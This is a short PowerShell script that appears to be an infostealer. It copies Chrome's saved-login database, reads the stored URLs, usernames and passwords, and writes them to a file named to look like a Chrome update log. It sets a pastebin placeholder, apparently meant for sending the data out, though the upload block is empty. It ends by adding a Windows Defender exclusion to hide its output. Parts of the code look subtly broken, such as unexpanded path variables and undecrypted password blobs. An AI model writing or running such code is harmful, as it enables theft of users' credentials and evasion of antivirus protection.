$pastebin = 'https://pastebin.com/raw/YOUR_PASTEBIN_ID'; # Replace with your pastebin raw link
$outfile = '$env:PUBLIC\chrome_update.log';
function Get-ChromePasswords {
    $chromePath = @(
        '$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data',
        '$env:LOCALAPPDATA\Google\Chrome\User Data\Profile *\Login Data'
    ) | ForEach-Object { Get-ChildItem -Path $_ -ErrorAction SilentlyContinue } | Select-Object -First 1
    if ($chromePath) {
        Copy-Item $chromePath.FullName '$env:TEMP\LoginData.db'
        $conn = New-Object System.Data.SQLite.SQLiteConnection('Data Source=$env:TEMP\LoginData.db')
        $conn.Open()
        $cmd = $conn.CreateCommand()
        $cmd.CommandText = 'SELECT origin_url, username_value, password_value FROM logins'
        $reader = $cmd.ExecuteReader()
        $passwords = @()
        while ($reader.Read()) {
            $url = $reader.GetString(0)
            $user = $reader.GetString(1)
            if ($reader.IsDBNull(2)) { $pass = '' } else {
                $passBytes = $reader.GetBlob(2, $false)
                $pass = [System.Text.Encoding]::UTF8.GetString($passBytes)
            }
            if ($user -and $url) { $passwords += [PSCustomObject]@{URL=$url;User=$user;Pass=$pass} }
        }
        $conn.Close(); Remove-Item '$env:TEMP\LoginData.db' -Force
        return $passwords
    }
    return @()
}
$passwords = Get-ChromePasswords
if ($passwords) {
    $report = $passwords | Format-Table -AutoSize | Out-String
    $report | Out-File $outfile -Encoding UTF8
    try {

    } catch {}

}
Add-MpPreference -ExclusionPath '$env:PUBLIC' -Force; exit
